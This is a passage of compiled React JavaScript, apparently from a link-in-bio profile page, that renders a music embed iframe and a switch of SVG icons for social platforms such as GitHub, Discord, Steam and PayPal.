                                            backgroundColor:
                                              t.primarycolor + "fa",
                                          },
                                          children: (0, c.jsx)("iframe", {
                                            className: "rounded-xl",
                                            src: e,
                                            width: "99%",
                                            height: e.includes(
                                              "open.spotify.com/embed/track/"
                                            )
                                              ? "80px"
                                              : "160px",
                                            frameBorder: "0",
                                            allowFullScreen: !1,
                                            allow:
                                              "autoplay; clipboard-write; encrypted-media; fullscreen; picture-in-picture",
                                          }),
                                        }),
                                      }),
                                    }),
                                  ],
                                });
                            })),
                        }),
                      }),
                    ],
                  }),
                }),
              ],
            }),
          ],
        });
      }
      function B(e, t, s) {
        return (
          t in e
            ? Object.defineProperty(e, t, {
                value: s,
                enumerable: !0,
                configurable: !0,
                writable: !0,
              })
            : (e[t] = s),
          e
        );
      }
      function Z(e) {
        for (var t = 1; t < arguments.length; t++) {
          var s = null != arguments[t] ? arguments[t] : {},
            c = Object.keys(s);
          "function" == typeof Object.getOwnPropertySymbols &&
            (c = c.concat(
              Object.getOwnPropertySymbols(s).filter(function (e) {
                return Object.getOwnPropertyDescriptor(s, e).enumerable;
              })
            )),
            c.forEach(function (t) {
              B(e, t, s[t]);
            });
        }
        return e;
      }
      var S = function (e) {
          switch (e) {
            case "Github":
              return (0, c.jsx)("svg", {
                xmlns: "http://www.w3.org/2000/svg",
                width: "16",
                height: "16",
                fill: "currentColor",
                className:
                  "h-7 w-7 text-[#ffffff] duration-300 hover:scale-110 hover:text-[#ffffff]",
                viewBox: "0 0 16 16",
                children: (0, c.jsx)("path", {
                  d: "M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.012 8.012 0 0 0 16 8c0-4.42-3.58-8-8-8z",
                }),
              });
            case "YouTube":
              return (0, c.jsx)("svg", {
                xmlns: "http://www.w3.org/2000/svg",
                width: "16",
                height: "16",
                fill: "currentColor",
                className:
                  "h-7 w-7 text-[#FF0000] duration-300 hover:scale-110 hover:text-[#FF0000]",
                viewBox: "0 0 16 16",
                children: (0, c.jsx)("path", {
                  d: "M8.051 1.999h.089c.822.003 4.987.033 6.11.335a2.01 2.01 0 0 1 1.415 1.42c.101.38.172.883.22 1.402l.01.104.022.26.008.104c.065.914.073 1.77.074 1.957v.075c-.001.194-.01 1.108-.082 2.06l-.008.105-.009.104c-.05.572-.124 1.14-.235 1.558a2.007 2.007 0 0 1-1.415 1.42c-1.16.312-5.569.334-6.18.335h-.142c-.309 0-1.587-.006-2.927-.052l-.17-.006-.087-.004-.171-.007-.171-.007c-1.11-.049-2.167-.128-2.654-.26a2.007 2.007 0 0 1-1.415-1.419c-.111-.417-.185-.986-.235-1.558L.09 9.82l-.008-.104A31.4 31.4 0 0 1 0 7.68v-.123c.002-.215.01-.958.064-1.778l.007-.103.003-.052.008-.104.022-.26.01-.104c.048-.519.119-1.023.22-1.402a2.007 2.007 0 0 1 1.415-1.42c.487-.13 1.544-.21 2.654-.26l.17-.007.172-.006.086-.003.171-.007A99.788 99.788 0 0 1 7.858 2h.193zM6.4 5.209v4.818l4.157-2.408L6.4 5.209z",
                }),
              });
            case "Twitch":
              return (0, c.jsxs)("svg", {
                xmlns: "http://www.w3.org/2000/svg",
                width: "16",
                height: "16",
                fill: "currentColor",
                className:
                  "h-7 w-7 text-[#6441a5] duration-300 hover:scale-110 hover:text-[#6441a5]",
                viewBox: "0 0 16 16",
                children: [
                  (0, c.jsx)("path", {
                    d: "M3.857 0 1 2.857v10.286h3.429V16l2.857-2.857H9.57L14.714 8V0H3.857zm9.714 7.429-2.285 2.285H9l-2 2v-2H4.429V1.143h9.142v6.286z",
                  }),
                  (0, c.jsx)("path", {
                    d: "M11.857 3.143h-1.143V6.57h1.143V3.143zm-3.143 0H7.571V6.57h1.143V3.143z",
                  }),
                ],
              });
            case "Twitter":
              return (0, c.jsx)("svg", {
                xmlns: "http://www.w3.org/2000/svg",
                width: "16",
                height: "16",
                fill: "currentColor",
                className:
                  "h-7 w-7 text-[#1DA1F2] duration-300 hover:scale-110 hover:text-[#1DA1F2]",
                viewBox: "0 0 16 16",
                children: (0, c.jsx)("path", {
                  d: "M5.026 15c6.038 0 9.341-5.003 9.341-9.334 0-.14 0-.282-.006-.422A6.685 6.685 0 0 0 16 3.542a6.658 6.658 0 0 1-1.889.518 3.301 3.301 0 0 0 1.447-1.817 6.533 6.533 0 0 1-2.087.793A3.286 3.286 0 0 0 7.875 6.03a9.325 9.325 0 0 1-6.767-3.429 3.289 3.289 0 0 0 1.018 4.382A3.323 3.323 0 0 1 .64 6.575v.045a3.288 3.288 0 0 0 2.632 3.218 3.203 3.203 0 0 1-.865.115 3.23 3.23 0 0 1-.614-.057 3.283 3.283 0 0 0 3.067 2.277A6.588 6.588 0 0 1 .78 13.58a6.32 6.32 0 0 1-.78-.045A9.344 9.344 0 0 0 5.026 15z",
                }),
              });
            case "Instagram":
              return (0, c.jsx)("svg", {
                xmlns: "http://www.w3.org/2000/svg",
                width: "16",
                height: "16",
                fill: "currentColor",
                className:
                  "h-7 w-7 text-[#C13584] duration-300 hover:scale-110 hover:text-[#C13584]",
                viewBox: "0 0 16 16",
                children: (0, c.jsx)("path", {
                  d: "M8 0C5.829 0 5.556.01 4.703.048 3.85.088 3.269.222 2.76.42a3.917 3.917 0 0 0-1.417.923A3.927 3.927 0 0 0 .42 2.76C.222 3.268.087 3.85.048 4.7.01 5.555 0 5.827 0 8.001c0 2.172.01 2.444.048 3.297.04.852.174 1.433.372 1.942.205.526.478.972.923 1.417.444.445.89.719 1.416.923.51.198 1.09.333 1.942.372C5.555 15.99 5.827 16 8 16s2.444-.01 3.298-.048c.851-.04 1.434-.174 1.943-.372a3.916 3.916 0 0 0 1.416-.923c.445-.445.718-.891.923-1.417.197-.509.332-1.09.372-1.942C15.99 10.445 16 10.173 16 8s-.01-2.445-.048-3.299c-.04-.851-.175-1.433-.372-1.941a3.926 3.926 0 0 0-.923-1.417A3.911 3.911 0 0 0 13.24.42c-.51-.198-1.092-.333-1.943-.372C10.443.01 10.172 0 7.998 0h.003zm-.717 1.442h.718c2.136 0 2.389.007 3.232.046.78.035 1.204.166 1.486.275.373.145.64.319.92.599.28.28.453.546.598.92.11.281.24.705.275 1.485.039.843.047 1.096.047 3.231s-.008 2.389-.047 3.232c-.035.78-.166 1.203-.275 1.485a2.47 2.47 0 0 1-.599.919c-.28.28-.546.453-.92.598-.28.11-.704.24-1.485.276-.843.038-1.096.047-3.232.047s-2.39-.009-3.233-.047c-.78-.036-1.203-.166-1.485-.276a2.478 2.478 0 0 1-.92-.598 2.48 2.48 0 0 1-.6-.92c-.109-.281-.24-.705-.275-1.485-.038-.843-.046-1.096-.046-3.233 0-2.136.008-2.388.046-3.231.036-.78.166-1.204.276-1.486.145-.373.319-.64.599-.92.28-.28.546-.453.92-.598.282-.11.705-.24 1.485-.276.738-.034 1.024-.044 2.515-.045v.002zm4.988 1.328a.96.96 0 1 0 0 1.92.96.96 0 0 0 0-1.92zm-4.27 1.122a4.109 4.109 0 1 0 0 8.217 4.109 4.109 0 0 0 0-8.217zm0 1.441a2.667 2.667 0 1 1 0 5.334 2.667 2.667 0 0 1 0-5.334z",
                }),
              });
            case "Reddit":
              return (0, c.jsxs)("svg", {
                xmlns: "http://www.w3.org/2000/svg",
                width: "16",
                height: "16",
                fill: "currentColor",
                className:
                  "h-7 w-7 text-[#FF4500] duration-300 hover:scale-110 hover:text-[#FF4500]",
                viewBox: "0 0 16 16",
                children: [
                  (0, c.jsx)("path", {
                    d: "M6.167 8a.831.831 0 0 0-.83.83c0 .459.372.84.83.831a.831.831 0 0 0 0-1.661zm1.843 3.647c.315 0 1.403-.038 1.976-.611a.232.232 0 0 0 0-.306.213.213 0 0 0-.306 0c-.353.363-1.126.487-1.67.487-.545 0-1.308-.124-1.671-.487a.213.213 0 0 0-.306 0 .213.213 0 0 0 0 .306c.564.563 1.652.61 1.977.61zm.992-2.807c0 .458.373.83.831.83.458 0 .83-.381.83-.83a.831.831 0 0 0-1.66 0z",
                  }),
                  (0, c.jsx)("path", {
                    d: "M16 8A8 8 0 1 1 0 8a8 8 0 0 1 16 0zm-3.828-1.165c-.315 0-.602.124-.812.325-.801-.573-1.9-.945-3.121-.993l.534-2.501 1.738.372a.83.83 0 1 0 .83-.869.83.83 0 0 0-.744.468l-1.938-.41a.203.203 0 0 0-.153.028.186.186 0 0 0-.086.134l-.592 2.788c-1.24.038-2.358.41-3.17.992-.21-.2-.496-.324-.81-.324a1.163 1.163 0 0 0-.478 2.224c-.02.115-.029.23-.029.353 0 1.795 2.091 3.256 4.669 3.256 2.577 0 4.668-1.451 4.668-3.256 0-.114-.01-.238-.029-.353.401-.181.688-.592.688-1.069 0-.65-.525-1.165-1.165-1.165z",
                  }),
                ],
              });
            case "NameMC":
              return (0, c.jsx)("svg", {
                viewBox: "-8 -8 16 16",
                className:
                  "h-7 w-7 text-[#020101] duration-300 hover:scale-110 hover:text-[#020101]",
                shapeRendering: "crispEdges",
                width: "20",
                height: "20",
                children: (0, c.jsx)("path", {
                  style: { fill: "#020101" },
                  d: "M-5-5L+3-5L+3-3L+5-3L+5+5L+3+5L+3-3L-3-3L-3+5L-5+5",
                }),
              });
            case "Personal":
              return (0, c.jsx)("svg", {
                xmlns: "http://www.w3.org/2000/svg",
                width: "16",
                height: "16",
                fill: "currentColor",
                className:
                  "h-7 w-7 text-[#ffffff] duration-300 hover:scale-110 hover:text-[#ffffff]",
                viewBox: "0 0 16 16",
                children: (0, c.jsx)("path", {
                  d: "M8 8a3 3 0 1 0 0-6 3 3 0 0 0 0 6zm2-3a2 2 0 1 1-4 0 2 2 0 0 1 4 0zm4 8c0 1-1 1-1 1H3s-1 0-1-1 1-4 6-4 6 3 6 4zm-1-.004c-.001-.246-.154-.986-.832-1.664C11.516 10.68 10.289 10 8 10c-2.29 0-3.516.68-4.168 1.332-.678.678-.83 1.418-.832 1.664h10z",
                }),
              });
            case "Telegram":
              return (0, c.jsx)("svg", {
                xmlns: "http://www.w3.org/2000/svg",
                width: "16",
                height: "16",
                fill: "currentColor",
                className:
                  "h-7 w-7 text-[#2AABEE] duration-300 hover:scale-110 hover:text-[#2AABEE]",
                viewBox: "0 0 16 16",
                children: (0, c.jsx)("path", {
                  d: "M16 8A8 8 0 1 1 0 8a8 8 0 0 1 16 0zM8.287 5.906c-.778.324-2.334.994-4.666 2.01-.378.15-.577.298-.595.442-.03.243.275.339.69.47l.175.055c.408.133.958.288 1.243.294.26.006.549-.1.868-.32 2.179-1.471 3.304-2.214 3.374-2.23.05-.012.12-.026.166.016.047.041.042.12.037.141-.03.129-1.227 1.241-1.846 1.817-.193.18-.33.307-.358.336a8.154 8.154 0 0 1-.188.186c-.38.366-.664.64.015 1.088.327.216.589.393.85.571.284.194.568.387.936.629.093.06.183.125.27.187.331.236.63.448.997.414.214-.02.435-.22.547-.82.265-1.417.786-4.486.906-5.751a1.426 1.426 0 0 0-.013-.315.337.337 0 0 0-.114-.217.526.526 0 0 0-.31-.093c-.3.005-.763.166-2.984 1.09z",
                }),
              });
            case "Soundcloud":
              return (0, c.jsxs)("svg", {
                fill: "#ff7700",
                xmlns: "http://www.w3.org/2000/svg",
                viewBox: "0 0 30 30",
                width: "30px",
                height: "30px",
                children: [
                  (0, c.jsx)("path", {
                    d: "M1.448 15.732c-.064 0-.116.051-.125.121l-.295 2.694.295 2.634c.008.07.061.122.125.122.063 0 .114-.05.125-.121l.336-2.635-.336-2.694C1.563 15.782 1.512 15.732 1.448 15.732zM.339 16.763c-.063 0-.112.049-.12.117L0 18.547l.219 1.638c.008.069.058.117.12.117.061 0 .11-.048.12-.116l.26-1.639-.26-1.667C.45 16.812.4 16.763.339 16.763zM2.628 15.203c-.08 0-.142.062-.15.147l-.28 3.197.28 3.08c.007.085.071.147.15.147.078 0 .141-.062.15-.147l.318-3.081-.318-3.197C2.768 15.265 2.706 15.203 2.628 15.203zM3.816 15.091c-.093 0-.169.074-.176.173l-.264 3.284.264 3.177c.008.098.083.173.176.173.092 0 .168-.074.175-.173l.301-3.177-.301-3.285C3.983 15.165 3.908 15.091 3.816 15.091zM5.215 15.5c-.007-.113-.095-.198-.202-.198-.108 0-.195.085-.202.199l-.249 3.047.249 3.203c.007.112.094.199.202.199.107 0 .194-.085.202-.199l.283-3.203L5.215 15.5zM6.221 13.367c-.121 0-.221.098-.227.225L5.76 18.549l.234 3.203c.007.125.106.224.227.224.12 0 .22-.099.227-.225v.001l.265-3.203-.265-4.958C6.441 13.466 6.341 13.367 6.221 13.367zM7.419 12.226c-.136 0-.247.11-.253.25l-.219 6.091.219 3.184C7.172 21.89 7.283 22 7.419 22c.135 0 .247-.11.252-.25v.002l.248-3.184-.247-6.092C7.666 12.335 7.554 12.226 7.419 12.226zM8.665 11.675c-.151 0-.273.122-.278.277l-.204 6.599.204 3.151c.006.154.127.275.278.275.15 0 .272-.121.278-.276v.002l.231-3.151-.231-6.6C8.937 11.797 8.815 11.675 8.665 11.675zM10.206 11.73c-.006-.17-.139-.302-.304-.302-.166 0-.299.133-.304.302l-.189 6.821.189 3.131c.005.168.138.3.304.3.165 0 .298-.132.304-.302l.213-3.129L10.206 11.73zM11.148 11.577c-.181 0-.325.144-.33.328l-.174 6.647.174 3.101c.004.182.149.326.329.326.18 0 .324-.144.329-.328v.002l.196-3.102-.196-6.648C11.472 11.72 11.328 11.577 11.148 11.577zM12.403 11.793c-.195 0-.352.156-.355.353l-.158 6.404.158 3.082c.004.196.159.352.355.352.195 0 .351-.155.355-.353v.003l.178-3.082-.178-6.405C12.755 11.949 12.598 11.793 12.403 11.793zM13.88 10.617c-.061-.041-.133-.065-.21-.065-.075 0-.145.023-.205.062-.104.067-.173.185-.175.318l-.001.072-.143 7.547c0 .005.143 3.064.143 3.064 0 .005.001.008.001.013.005.085.037.164.089.226.07.084.175.138.292.138.103 0 .198-.042.266-.112.068-.068.113-.163.114-.268l.016-.303.144-2.757-.16-7.622C14.048 10.801 13.98 10.685 13.88 10.617z",
                  }),
                  (0, c.jsx)("path", {
                    d: "M14.049 21.615L14.049 21.614 14.049 21.615 14.049 21.613 14.05 21.612 14.049 21.613 14.049 21.614zM15.136 9.894c-.061-.037-.131-.058-.206-.058-.097 0-.187.035-.256.093-.09.074-.148.187-.15.312l-.001.042-.166 8.271.084 1.529.083 1.488c.003.22.185.402.407.402.22 0 .403-.182.406-.405v.004l0 0 .181-3.017 0 0-.181-8.313C15.333 10.094 15.253 9.965 15.136 9.894zM26.31 14.619c-.505 0-.988.102-1.427.287-.293-3.325-3.083-5.934-6.484-5.934-.833 0-1.643.164-2.361.441-.278.108-.352.218-.355.434v11.711c.003.226.178.401.398.424.009.001 10.228 0 10.228 0 2.038 0 3.69-1.634 3.69-3.672C30 16.271 28.348 14.619 26.31 14.619z",
                  }),
                ],
              });
            case "Spotify":
              return (0, c.jsx)("svg", {
                xmlns: "http://www.w3.org/2000/svg",
                width: "16",
                height: "16",
                fill: "currentColor",
                className:
                  "h-7 w-7 text-[#1DB954] duration-300 hover:scale-110 hover:text-[#1DB954]",
                viewBox: "0 0 16 16",
                children: (0, c.jsx)("path", {
                  d: "M8 0a8 8 0 1 0 0 16A8 8 0 0 0 8 0zm3.669 11.538a.498.498 0 0 1-.686.165c-1.879-1.147-4.243-1.407-7.028-.77a.499.499 0 0 1-.222-.973c3.048-.696 5.662-.397 7.77.892a.5.5 0 0 1 .166.686zm.979-2.178a.624.624 0 0 1-.858.205c-2.15-1.321-5.428-1.704-7.972-.932a.625.625 0 0 1-.362-1.194c2.905-.881 6.517-.454 8.986 1.063a.624.624 0 0 1 .206.858zm.084-2.268C10.154 5.56 5.9 5.419 3.438 6.166a.748.748 0 1 1-.434-1.432c2.825-.857 7.523-.692 10.492 1.07a.747.747 0 1 1-.764 1.288z",
                }),
              });
            case "Discord":
              return (0, c.jsx)("svg", {
                xmlns: "http://www.w3.org/2000/svg",
                width: "16",
                height: "16",
                fill: "currentColor",
                className:
                  "h-7 w-7 text-[#7289DA] duration-300 hover:scale-110 hover:text-[#586fc2]",
                viewBox: "0 0 16 16",
                children: (0, c.jsx)("path", {
                  d: "M13.545 2.907a13.227 13.227 0 0 0-3.257-1.011.05.05 0 0 0-.052.025c-.141.25-.297.577-.406.833a12.19 12.19 0 0 0-3.658 0 8.258 8.258 0 0 0-.412-.833.051.051 0 0 0-.052-.025c-1.125.194-2.22.534-3.257 1.011a.041.041 0 0 0-.021.018C.356 6.024-.213 9.047.066 12.032c.001.014.01.028.021.037a13.276 13.276 0 0 0 3.995 2.02.05.05 0 0 0 .056-.019c.308-.42.582-.863.818-1.329a.05.05 0 0 0-.01-.059.051.051 0 0 0-.018-.011 8.875 8.875 0 0 1-1.248-.595.05.05 0 0 1-.02-.066.051.051 0 0 1 .015-.019c.084-.063.168-.129.248-.195a.05.05 0 0 1 .051-.007c2.619 1.196 5.454 1.196 8.041 0a.052.052 0 0 1 .053.007c.08.066.164.132.248.195a.051.051 0 0 1-.004.085 8.254 8.254 0 0 1-1.249.594.05.05 0 0 0-.03.03.052.052 0 0 0 .003.041c.24.465.515.909.817 1.329a.05.05 0 0 0 .056.019 13.235 13.235 0 0 0 4.001-2.02.049.049 0 0 0 .021-.037c.334-3.451-.559-6.449-2.366-9.106a.034.034 0 0 0-.02-.019Zm-8.198 7.307c-.789 0-1.438-.724-1.438-1.612 0-.889.637-1.613 1.438-1.613.807 0 1.45.73 1.438 1.613 0 .888-.637 1.612-1.438 1.612Zm5.316 0c-.788 0-1.438-.724-1.438-1.612 0-.889.637-1.613 1.438-1.613.807 0 1.451.73 1.438 1.613 0 .888-.631 1.612-1.438 1.612Z",
                }),
              });
            case "Snapchat":
              return (0, c.jsx)("svg", {
                xmlns: "http://www.w3.org/2000/svg",
                width: "16",
                height: "16",
                fill: "currentColor",
                className:
                  "h-7 w-7 text-[#FFFC00] duration-300 hover:scale-110 hover:text-[#FFFC00]",
                viewBox: "0 0 16 16",
                children: (0, c.jsx)("path", {
                  d: "M15.943 11.526c-.111-.303-.323-.465-.564-.599a1.416 1.416 0 0 0-.123-.064l-.219-.111c-.752-.399-1.339-.902-1.746-1.498a3.387 3.387 0 0 1-.3-.531c-.034-.1-.032-.156-.008-.207a.338.338 0 0 1 .097-.1c.129-.086.262-.173.352-.231.162-.104.289-.187.371-.245.309-.216.525-.446.66-.702a1.397 1.397 0 0 0 .069-1.16c-.205-.538-.713-.872-1.329-.872a1.829 1.829 0 0 0-.487.065c.006-.368-.002-.757-.035-1.139-.116-1.344-.587-2.048-1.077-2.61a4.294 4.294 0 0 0-1.095-.881C9.764.216 8.92 0 7.999 0c-.92 0-1.76.216-2.505.641-.412.232-.782.53-1.097.883-.49.562-.96 1.267-1.077 2.61-.033.382-.04.772-.036 1.138a1.83 1.83 0 0 0-.487-.065c-.615 0-1.124.335-1.328.873a1.398 1.398 0 0 0 .067 1.161c.136.256.352.486.66.701.082.058.21.14.371.246l.339.221a.38.38 0 0 1 .109.11c.026.053.027.11-.012.217a3.363 3.363 0 0 1-.295.52c-.398.583-.968 1.077-1.696 1.472-.385.204-.786.34-.955.8-.128.348-.044.743.28 1.075.119.125.257.23.409.31a4.43 4.43 0 0 0 1 .4.66.66 0 0 1 .202.09c.118.104.102.26.259.488.079.118.18.22.296.3.33.229.701.243 1.095.258.355.014.758.03 1.217.18.19.064.389.186.618.328.55.338 1.305.802 2.566.802 1.262 0 2.02-.466 2.576-.806.227-.14.424-.26.609-.321.46-.152.863-.168 1.218-.181.393-.015.764-.03 1.095-.258a1.14 1.14 0 0 0 .336-.368c.114-.192.11-.327.217-.42a.625.625 0 0 1 .19-.087 4.446 4.446 0 0 0 1.014-.404c.16-.087.306-.2.429-.336l.004-.005c.304-.325.38-.709.256-1.047Zm-1.121.602c-.684.378-1.139.337-1.493.565-.3.193-.122.61-.34.76-.269.186-1.061-.012-2.085.326-.845.279-1.384 1.082-2.903 1.082-1.519 0-2.045-.801-2.904-1.084-1.022-.338-1.816-.14-2.084-.325-.218-.15-.041-.568-.341-.761-.354-.228-.809-.187-1.492-.563-.436-.24-.189-.39-.044-.46 2.478-1.199 2.873-3.05 2.89-3.188.022-.166.045-.297-.138-.466-.177-.164-.962-.65-1.18-.802-.36-.252-.52-.503-.402-.812.082-.214.281-.295.49-.295a.93.93 0 0 1 .197.022c.396.086.78.285 1.002.338.027.007.054.01.082.011.118 0 .16-.06.152-.195-.026-.433-.087-1.277-.019-2.066.094-1.084.444-1.622.859-2.097.2-.229 1.137-1.22 2.93-1.22 1.792 0 2.732.987 2.931 1.215.416.475.766 1.013.859 2.098.068.788.009 1.632-.019 2.065-.01.142.034.195.152.195a.35.35 0 0 0 .082-.01c.222-.054.607-.253 1.002-.338a.912.912 0 0 1 .197-.023c.21 0 .409.082.49.295.117.309-.04.56-.401.812-.218.152-1.003.638-1.18.802-.184.169-.16.3-.139.466.018.14.413 1.991 2.89 3.189.147.073.394.222-.041.464Z",
                }),
              });
            case "Steam":
              return (0, c.jsxs)("svg", {
                xmlns: "http://www.w3.org/2000/svg",
                width: "16",
                height: "16",
                fill: "currentColor",
                className:
                  "h-7 w-7 text-[#2a475e] duration-300 hover:scale-110 hover:text-[#2a475e]",
                viewBox: "0 0 16 16",
                children: [
                  (0, c.jsx)("path", {
                    d: "M.329 10.333A8.01 8.01 0 0 0 7.99 16C12.414 16 16 12.418 16 8s-3.586-8-8.009-8A8.006 8.006 0 0 0 0 7.468l.003.006 4.304 1.769A2.198 2.198 0 0 1 5.62 8.88l1.96-2.844-.001-.04a3.046 3.046 0 0 1 3.042-3.043 3.046 3.046 0 0 1 3.042 3.043 3.047 3.047 0 0 1-3.111 3.044l-2.804 2a2.223 2.223 0 0 1-3.075 2.11 2.217 2.217 0 0 1-1.312-1.568L.33 10.333Z",
                  }),
                  (0, c.jsx)("path", {
                    d: "M4.868 12.683a1.715 1.715 0 0 0 1.318-3.165 1.705 1.705 0 0 0-1.263-.02l1.023.424a1.261 1.261 0 1 1-.97 2.33l-.99-.41a1.7 1.7 0 0 0 .882.84Zm3.726-6.687a2.03 2.03 0 0 0 2.027 2.029 2.03 2.03 0 0 0 2.027-2.029 2.03 2.03 0 0 0-2.027-2.027 2.03 2.03 0 0 0-2.027 2.027Zm2.03-1.527a1.524 1.524 0 1 1-.002 3.048 1.524 1.524 0 0 1 .002-3.048Z",
                  }),
                ],
              });
            case "OGUsers":
              return (0, c.jsxs)("svg", {
                xmlns: "http://www.w3.org/2000/svg",
                width: "16",
                height: "16",
                fill: "currentColor",
                className:
                  "h-7 w-7 text-[rgb(55,55,56)] duration-300 hover:scale-110 hover:text-[rgb(55,55,56)]",
                viewBox: "0 0 16 16",
                children: [
                  (0, c.jsx)("path", {
                    d: "M11 6a3 3 0 1 1-6 0 3 3 0 0 1 6 0z",
                  }),
                  (0, c.jsx)("path", {
                    fillRule: "evenodd",
                    d: "M0 8a8 8 0 1 1 16 0A8 8 0 0 1 0 8zm8-7a7 7 0 0 0-5.468 11.37C3.242 11.226 4.805 10 8 10s4.757 1.225 5.468 2.37A7 7 0 0 0 8 1z",
                  }),
                ],
              });
            case "Email":
              return (0, c.jsx)("svg", {
                xmlns: "http://www.w3.org/2000/svg",
                width: "16",
                height: "16",
                fill: "currentColor",
                className:
                  "h-7 w-7 text-[#ffffff] duration-300 hover:scale-110 hover:text-[#ffffff]",
                viewBox: "0 0 16 16",
                children: (0, c.jsx)("path", {
                  d: "M0 4a2 2 0 0 1 2-2h12a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2V4Zm2-1a1 1 0 0 0-1 1v.217l7 4.2 7-4.2V4a1 1 0 0 0-1-1H2Zm13 2.383-4.708 2.825L15 11.105V5.383Zm-.034 6.876-5.64-3.471L8 9.583l-1.326-.795-5.64 3.47A1 1 0 0 0 2 13h12a1 1 0 0 0 .966-.741ZM1 11.105l4.708-2.897L1 5.383v5.722Z",
                }),
              });
            case "Facebook":
              return (0, c.jsx)("svg", {
                xmlns: "http://www.w3.org/2000/svg",
                width: "16",
                height: "16",
                fill: "currentColor",
                className:
                  "h-7 w-7 text-[#4267B2] duration-300 hover:scale-110 hover:text-[#4267B2]",
                viewBox: "0 0 16 16",
                children: (0, c.jsx)("path", {
                  d: "M16 8.049c0-4.446-3.582-8.05-8-8.05C3.58 0-.002 3.603-.002 8.05c0 4.017 2.926 7.347 6.75 7.951v-5.625h-2.03V8.05H6.75V6.275c0-2.017 1.195-3.131 3.022-3.131.876 0 1.791.157 1.791.157v1.98h-1.009c-.993 0-1.303.621-1.303 1.258v1.51h2.218l-.354 2.326H9.25V16c3.824-.604 6.75-3.934 6.75-7.951z",
                }),
              });
            case "TikTok":
              return (0, c.jsx)("svg", {
                xmlns: "http://www.w3.org/2000/svg",
                width: "16",
                height: "16",
                fill: "currentColor",
                className:
                  "h-7 w-7 text-[#FE2C55] duration-300 hover:scale-110 hover:text-[#FE2C55]",
                viewBox: "0 0 16 16",
                children: (0, c.jsx)("path", {
                  d: "M9 0h1.98c.144.715.54 1.617 1.235 2.512C12.895 3.389 13.797 4 15 4v2c-1.753 0-3.07-.814-4-1.829V11a5 5 0 1 1-5-5v2a3 3 0 1 0 3 3V0Z",
                }),
              });
            case "WhatsApp":
              return (0, c.jsx)("svg", {
                xmlns: "http://www.w3.org/2000/svg",
                width: "16",
                height: "16",
                fill: "currentColor",
                className:
                  "h-7 w-7 text-[#25D366] duration-300 hover:scale-110 hover:text-[#25D366]",
                viewBox: "0 0 16 16",
                children: (0, c.jsx)("path", {
                  d: "M13.601 2.326A7.854 7.854 0 0 0 7.994 0C3.627 0 .068 3.558.064 7.926c0 1.399.366 2.76 1.057 3.965L0 16l4.204-1.102a7.933 7.933 0 0 0 3.79.965h.004c4.368 0 7.926-3.558 7.93-7.93A7.898 7.898 0 0 0 13.6 2.326zM7.994 14.521a6.573 6.573 0 0 1-3.356-.92l-.24-.144-2.494.654.666-2.433-.156-.251a6.56 6.56 0 0 1-1.007-3.505c0-3.626 2.957-6.584 6.591-6.584a6.56 6.56 0 0 1 4.66 1.931 6.557 6.557 0 0 1 1.928 4.66c-.004 3.639-2.961 6.592-6.592 6.592zm3.615-4.934c-.197-.099-1.17-.578-1.353-.646-.182-.065-.315-.099-.445.099-.133.197-.513.646-.627.775-.114.133-.232.148-.43.05-.197-.1-.836-.308-1.592-.985-.59-.525-.985-1.175-1.103-1.372-.114-.198-.011-.304.088-.403.087-.088.197-.232.296-.346.1-.114.133-.198.198-.33.065-.134.034-.248-.015-.347-.05-.099-.445-1.076-.612-1.47-.16-.389-.323-.335-.445-.34-.114-.007-.247-.007-.38-.007a.729.729 0 0 0-.529.247c-.182.198-.691.677-.691 1.654 0 .977.71 1.916.81 2.049.098.133 1.394 2.132 3.383 2.992.47.205.84.326 1.129.418.475.152.904.129 1.246.08.38-.058 1.171-.48 1.338-.943.164-.464.164-.86.114-.943-.049-.084-.182-.133-.38-.232z",
                }),
              });
            case "WeHeartIt":
              return (0, c.jsxs)("svg", {
                xmlns: "http://www.w3.org/2000/svg",
                width: "16",
                height: "16",
                fill: "currentColor",
                className:
                  "h-7 w-7 text-[#ff3e8e] duration-300 hover:scale-110 hover:text-[#ff3e8e]",
                viewBox: "0 0 16 16",
                children: [
                  (0, c.jsx)("path", {
                    d: "M14 1a1 1 0 0 1 1 1v8a1 1 0 0 1-1 1h-2.5a2 2 0 0 0-1.6.8L8 14.333 6.1 11.8a2 2 0 0 0-1.6-.8H2a1 1 0 0 1-1-1V2a1 1 0 0 1 1-1h12ZM2 0a2 2 0 0 0-2 2v8a2 2 0 0 0 2 2h2.5a1 1 0 0 1 .8.4l1.9 2.533a1 1 0 0 0 1.6 0l1.9-2.533a1 1 0 0 1 .8-.4H14a2 2 0 0 0 2-2V2a2 2 0 0 0-2-2H2Z",
                  }),
                  (0, c.jsx)("path", {
                    d: "M8 3.993c1.664-1.711 5.825 1.283 0 5.132-5.825-3.85-1.664-6.843 0-5.132Z",
                  }),
                ],
              });
            case "Kik":
              return (0, c.jsxs)("svg", {
                fill: "#5DCD11",
                xmlns: "http://www.w3.org/2000/svg",
                className:
                  "h-7 w-7 text-[#5DCD11] duration-300 hover:scale-110 hover:text-[#5DCD11]",
                viewBox: "0 0 30 30",
                width: "30px",
                height: "30px",
                children: [
                  (0, c.jsx)("path", {
                    fill: "none",
                    stroke: "#000000",
                    strokeLinecap: "round",
                    "stroke-linejoin": "round",
                    "stroke-miterlimit": "10",
                    "stroke-width": "5",
                    d: "M9.5 2.5L9.5 23.5M19.5 8.5L9.5 18.5M20.5 23.5L14.5 13.5",
                  }),
                  (0, c.jsx)("path", {
                    d: "M27 14.5A2.5 2.5 0 1 0 27 19.5A2.5 2.5 0 1 0 27 14.5Z",
                  }),
                ],
              });
            case "PayPal":
              return (0, c.jsx)("svg", {
                xmlns: "http://www.w3.org/2000/svg",
                width: "16",
                height: "16",
                fill: "currentColor",
                className:
